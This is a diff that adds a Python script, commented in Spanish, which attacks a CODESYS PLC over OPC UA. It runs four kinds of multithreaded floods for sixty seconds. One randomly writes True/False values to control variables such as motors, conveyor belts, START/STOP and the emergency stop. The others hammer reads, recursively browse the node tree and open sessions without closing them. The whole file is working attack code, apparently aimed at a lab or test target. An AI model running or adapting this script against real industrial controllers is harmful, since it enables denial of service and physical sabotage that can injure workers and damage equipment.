@@ -1,0 +1,83 @@
+from opcua import Client
+import threading
+import time
+import random
+import socket
+
+# Configuración del objetivo
+PLC_ENDPOINT = "opc.tcp://10.10.10.53:4840"
+VARIABLES = [
+    "ACIL_STOP", "DONER_MOTOR_1", "DONER_MOTOR_2", "DONER_MOTOR_3",
+    "GRI_BANT", "GRI_SENSOR", "MAVI_BANT", "MAVI_SENSOR",
+    "MOTOR_1", "MOTOR_3", "MOTOR_4", "MOTOR_5", "MOTOR_6",
+    "SISTEM", "START", "STOP",
+    "YAN_DONER_1", "YAN_DONER_2", "YAN_DONER_3",
+    "YESIL_BANT", "YESIL_SENSOR"
+]
+
+DURATION = 60
+THREADS_PER_TYPE = 30
+start_time = time.time()
+
+# === ATAQUE 1: Escritura masiva sin pausa ===
+def hammer_write():
+    try:
+        client = Client(PLC_ENDPOINT)
+        client.connect()
+        while time.time() - start_time < DURATION:
+            for var in VARIABLES:
+                node = client.get_node(f"ns=4;s=|var|{var}")
+                node.set_value(random.choice([True, False]))
+    except:
+        pass
+
+# === ATAQUE 2: Lectura masiva infinita ===
+def hammer_read():
+    try:
+        client = Client(PLC_ENDPOINT)
+        client.connect()
+        while time.time() - start_time < DURATION:
+            for var in VARIABLES:
+                node = client.get_node(f"ns=4;s=|var|{var}")
+                _ = node.get_value()
+    except:
+        pass
+
+# === ATAQUE 3: Navegación profunda sin fin ===
+def hammer_browse():
+    try:
+        client = Client(PLC_ENDPOINT)
+        client.connect()
+        root = client.get_root_node()
+        while time.time() - start_time < DURATION:
+            for obj in root.get_children():
+                for c1 in obj.get_children():
+                    for c2 in c1.get_children():
+                        for c3 in c2.get_children():
+                            _ = c3.get_browse_name()
+    except:
+        pass
+
+# === ATAQUE 4: Flood de sesiones TCP sin cerrar ===
+def hammer_connect():
+    while time.time() - start_time < DURATION:
+        try:
+            c = Client(PLC_ENDPOINT)
+            c.connect()
+        except:
+            break
+
+# === Lanzar todos los tipos de ataque ===
+print("[+] Iniciando ataque definitivo contra CODESYS...")
+
+for _ in range(THREADS_PER_TYPE):
+    threading.Thread(target=hammer_write).start()
+    threading.Thread(target=hammer_read).start()
+    threading.Thread(target=hammer_browse).start()
+    threading.Thread(target=hammer_connect).start()
+
+# Esperar hasta terminar
+while time.time() - start_time < DURATION:
+    pass
+
+print("[✔] Ataque finalizado.")
